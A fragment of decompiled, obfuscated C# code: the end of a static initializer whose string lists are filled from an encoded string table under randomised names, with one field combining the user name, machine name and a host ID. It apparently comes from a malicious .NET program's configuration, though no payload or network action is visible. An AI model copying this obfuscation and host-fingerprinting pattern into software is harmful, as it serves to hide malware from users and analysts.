			NGKPoQcRFBDfbNt(getString_0(107410007)),
			NGKPoQcRFBDfbNt(getString_0(107409998)),
			NGKPoQcRFBDfbNt(getString_0(107409917)),
			NGKPoQcRFBDfbNt(getString_0(107409884)),
			NGKPoQcRFBDfbNt(getString_0(107409867)),
			NGKPoQcRFBDfbNt(getString_0(107409790)),
			NGKPoQcRFBDfbNt(getString_0(107409261)),
			NGKPoQcRFBDfbNt(getString_0(107409184)),
			NGKPoQcRFBDfbNt(getString_0(107409167)),
			NGKPoQcRFBDfbNt(getString_0(107409134)),
			NGKPoQcRFBDfbNt(getString_0(107409061)),
			NGKPoQcRFBDfbNt(getString_0(107409020)),
			NGKPoQcRFBDfbNt(getString_0(107409519)),
			NGKPoQcRFBDfbNt(getString_0(107412264)),
			NGKPoQcRFBDfbNt(getString_0(107409486)),
			NGKPoQcRFBDfbNt(getString_0(107409413)),
			NGKPoQcRFBDfbNt(getString_0(107409388)),
			NGKPoQcRFBDfbNt(getString_0(107409359)),
			NGKPoQcRFBDfbNt(getString_0(107409326)),
			NGKPoQcRFBDfbNt(getString_0(107409293)),
			NGKPoQcRFBDfbNt(getString_0(107408700)),
			NGKPoQcRFBDfbNt(getString_0(107408671)),
			NGKPoQcRFBDfbNt(getString_0(107408658)),
			NGKPoQcRFBDfbNt(getString_0(107408581)),
			NGKPoQcRFBDfbNt(getString_0(107408540)),
			NGKPoQcRFBDfbNt(getString_0(107408995)),
			NGKPoQcRFBDfbNt(getString_0(107408978)),
			NGKPoQcRFBDfbNt(getString_0(107408949)),
			NGKPoQcRFBDfbNt(getString_0(107408904))
		};
		REZEphvZUr = new List<string>
		{
			NGKPoQcRFBDfbNt(getString_0(107408831)),
			NGKPoQcRFBDfbNt(getString_0(107408814)),
			NGKPoQcRFBDfbNt(getString_0(107408221)),
			NGKPoQcRFBDfbNt(getString_0(107408204)),
			NGKPoQcRFBDfbNt(getString_0(107408123)),
			NGKPoQcRFBDfbNt(getString_0(107408058)),
			NGKPoQcRFBDfbNt(getString_0(107408013)),
			NGKPoQcRFBDfbNt(getString_0(107408464))
		};
		aywbxlBbStFe = new List<string>
		{
			NGKPoQcRFBDfbNt(getString_0(107408375)),
			NGKPoQcRFBDfbNt(getString_0(107408374)),
			NGKPoQcRFBDfbNt(getString_0(107408329)),
			NGKPoQcRFBDfbNt(getString_0(107408248)),
			NGKPoQcRFBDfbNt(getString_0(107407703)),
			NGKPoQcRFBDfbNt(getString_0(107407654)),
			NGKPoQcRFBDfbNt(getString_0(107407609)),
			NGKPoQcRFBDfbNt(getString_0(107407576)),
			NGKPoQcRFBDfbNt(getString_0(107407543)),
			NGKPoQcRFBDfbNt(getString_0(107407542)),
			NGKPoQcRFBDfbNt(getString_0(107407509)),
			NGKPoQcRFBDfbNt(getString_0(107407988)),
			NGKPoQcRFBDfbNt(getString_0(107407947)),
			NGKPoQcRFBDfbNt(getString_0(107407874)),
			NGKPoQcRFBDfbNt(getString_0(107407861)),
			NGKPoQcRFBDfbNt(getString_0(107407828)),
			NGKPoQcRFBDfbNt(getString_0(107407787)),
			NGKPoQcRFBDfbNt(getString_0(107407754)),
			NGKPoQcRFBDfbNt(getString_0(107407169)),
			NGKPoQcRFBDfbNt(getString_0(107407128)),
			NGKPoQcRFBDfbNt(getString_0(107407095)),
			NGKPoQcRFBDfbNt(getString_0(107407086)),
			NGKPoQcRFBDfbNt(getString_0(107407053)),
			NGKPoQcRFBDfbNt(getString_0(107408375)),
			NGKPoQcRFBDfbNt(getString_0(107406980)),
			NGKPoQcRFBDfbNt(getString_0(107407451)),
			NGKPoQcRFBDfbNt(getString_0(107407438)),
			NGKPoQcRFBDfbNt(getString_0(107407405)),
			NGKPoQcRFBDfbNt(getString_0(107407332)),
			NGKPoQcRFBDfbNt(getString_0(107407291)),
			NGKPoQcRFBDfbNt(getString_0(107407258)),
			NGKPoQcRFBDfbNt(getString_0(107407249)),
			NGKPoQcRFBDfbNt(getString_0(107406696)),
			NGKPoQcRFBDfbNt(getString_0(107408374)),
			NGKPoQcRFBDfbNt(getString_0(107406623)),
			NGKPoQcRFBDfbNt(getString_0(107408329)),
			NGKPoQcRFBDfbNt(getString_0(107406590)),
			NGKPoQcRFBDfbNt(getString_0(107406557)),
			NGKPoQcRFBDfbNt(getString_0(107406548)),
			NGKPoQcRFBDfbNt(getString_0(107406515)),
			NGKPoQcRFBDfbNt(getString_0(107406474)),
			NGKPoQcRFBDfbNt(getString_0(107406913)),
			NGKPoQcRFBDfbNt(getString_0(107406880)),
			NGKPoQcRFBDfbNt(getString_0(107406847)),
			NGKPoQcRFBDfbNt(getString_0(107406838)),
			NGKPoQcRFBDfbNt(getString_0(107406797)),
			NGKPoQcRFBDfbNt(getString_0(107406724))
		};
		bsRxjoCdnSAQaTIYq = new List<string>
		{
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107406171))),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107406154))),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107406061))),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107405964))),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107406383))),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107406286))),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107405681))),
			NGKPoQcRFBDfbNt(getString_0(107405584)),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107405491))),
			NGKPoQcRFBDfbNt(getString_0(107405906)),
			NGKPoQcRFBDfbNt(getString_0(107405813)),
			NGKPoQcRFBDfbNt(getString_0(107405716)),
			NGKPoQcRFBDfbNt(getString_0(107405079)),
			NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107406171)))
		};
		tzcCHjlkJpN = NGKPoQcRFBDfbNt(getString_0(107405014));
		wnvGvgZBBKiu = new List<string>
		{
			NGKPoQcRFBDfbNt(getString_0(107405381)),
			NGKPoQcRFBDfbNt(getString_0(107405187)),
			NGKPoQcRFBDfbNt(getString_0(107404481)),
			NGKPoQcRFBDfbNt(getString_0(107404799)),
			NGKPoQcRFBDfbNt(getString_0(107404093)),
			NGKPoQcRFBDfbNt(getString_0(107403899))
		};
		hHKYbpRgNB = new List<string>
		{
			NGKPoQcRFBDfbNt(getString_0(107404217)),
			NGKPoQcRFBDfbNt(getString_0(107404156)),
			NGKPoQcRFBDfbNt(getString_0(107403583))
		};
		nLsuIQfSGYaFl = getString_0(107397017);
		RopvnmimaAke = getString_0(107397017);
		lmvPGGutkwMoYtrw = new DateTime(2000, 1, 1);
		DDFLGVkknj = new DateTime(2100, 1, 1);
		gdbMFWmQXamr = getString_0(107396760);
		gFTAyVipGERPhv = getString_0(107386059);
		zJHlwZECLg = getString_0(107397017);
		SWvJSQFcniIKT = getString_0(107397017);
		FvoWLaSkosPnx = getString_0(107397017);
		OldMIpWrHMgbj = getString_0(107396760);
		FHvZPbVnqqECySl = getString_0(107397017);
		WaGdjztjPUPAi = getString_0(107397017);
		VhmHymKdwdhl = new List<string>
		{
			getString_0(107396156),
			getString_0(107395358),
			getString_0(107396190),
			getString_0(107395271)
		};
		DqotASAdvjyOTQWi = getString_0(107397017);
		KrPsgnPgWT = getString_0(107403522);
		qcIqXiFiQf = getString_0(107397017);
		KaXdMRxGsnsgnb = getString_0(107397017);
		qjrkOugCcwWSZn = getString_0(107397017);
		vCrKPOvgbnF = string.Empty;
		cjxrAlGIVjeC = getString_0(107397017);
		vcMyxkfSJn = getString_0(107397017);
		QJWbWKNyLMKPbYy = getString_0(107397017);
		bcgVPenWmNfHuQ = getString_0(107389193);
		AsIpwedYmHx = getString_0(107389193);
		iidHyYJTuAGe = getString_0(107397017);
		pIAnLqxOqdkBxRO = getString_0(107396760);
		dJsRlxFlxsNlxDqFIG = getString_0(107396760);
		CtEQKkNOvvMnA = getString_0(107397017);
		zjHiTkCXWJ = getString_0(107397017);
		yslTNDhnjwP = getString_0(107403517);
		tQtBXqNfbamgSe = getString_0(107397017);
		HXsKUaUHXv = getString_0(107397017);
		RmGQaqoiaBTr = getString_0(107403532);
		ZnKUGBYONLhFoD = getString_0(107397017);
		QaKSEATLAjux = getString_0(107397017);
		hMpaWmVQfeGtnt = getString_0(107396760);
		QkIQdsdubJlar = getString_0(107397017);
		jkeBzDssrUOR = getString_0(107403483);
		gKOCBIIDwanJ = getString_0(107396760);
		ibVWwozpAGuIfs = getString_0(107396760);
		sGJvyLYxpw = getString_0(107397017);
		GwPXdyNycpzfnH = getString_0(107397017);
		rankoHCABHptgp = new string[0];
		tVdkKlIvaDpXN = getString_0(107397017);
		ZefUNZPKuQWv = true;
		bVfPZEEQpWG = getString_0(107397017);
		kGnGVVSmVYCjkQ = true;
		XflozndKhjSu = false;
		ftsyMaxyfMDPN = false;
		amIpEgDOTBvle = false;
		mldgFSRddxG = getString_0(107403502);
		yqFjfeWQNnFtS = false;
		uIfiDrCneWlVF = false;
		PFxkWYfBHNnz = false;
		ahRifMUVdZFjN = false;
		GPXFyHxJVGs = true;
		dQyocPsefnEBBf = getString_0(107403449) + Environment.UserName + getString_0(107403468) + Environment.MachineName + getString_0(107403415) + WspNJLioodtR.UyvXvDpzFTru() + getString_0(107403442);
		pjFetgiEucLksJ = false;
		OOvmYuSaZeFkmPR = new Stopwatch();
		IkmoiloXkEwN = 0;
		JhEGykDTAlk = 0;
		YkwjPTGZpc = false;
		EYBkUQfzxCUj = getString_0(107403433) + WspNJLioodtR.UyvXvDpzFTru() + getString_0(107403392);
		HJpCGPeEqp = new string[1] { getString_0(107403387) };
		WmGQobxHRrmUm = new List<string>();
		lYuNICMXohCnU = 0;
		EEZuvhlZpe = true;
		YnaGkNTsWNftXs = false;
		hRhakSWzjqeY = false;
		VGRnMzNnqlQlWo = false;
		RpKGbvUeVnU = false;
		fAHytlzCCTvqa = new List<string>();
		TPFsPplHMyJ = new List<string>();
		ReMHMlSRXfwS = new List<string>();
	}
}
